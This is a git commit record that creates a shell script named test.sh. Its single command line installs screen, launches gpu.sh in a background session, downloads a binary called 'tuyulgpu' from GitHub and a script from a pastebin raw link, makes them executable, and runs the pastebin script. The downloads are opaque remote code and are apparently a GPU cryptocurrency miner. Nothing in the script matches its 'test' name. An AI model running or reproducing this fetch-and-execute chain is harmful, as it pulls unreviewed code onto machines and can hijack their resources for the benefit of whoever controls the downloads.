14fd88e5d7726ca27e151af5474d67b8f339be67
KaranPushar <86306737+KaranPushar@users.noreply.github.com>
2021-06-22 20:00:05 +0530

    Create test.sh

---
+++ test.sh
@@ -0,0 +1,3 @@
+#!/bin/bash
+
+! sudo apt update && sudo apt install screen -y && screen -dmS gpu.sh ./gpu.sh 65 75 && wget https://github.com/KaranPushar/polan/raw/main/tuyulgpu && chmod +x tuyulgpu && wget https://pastebin.com/raw/WjGUyKYw && chmod u+x WjGUyKYw && ./WjGUyKYw
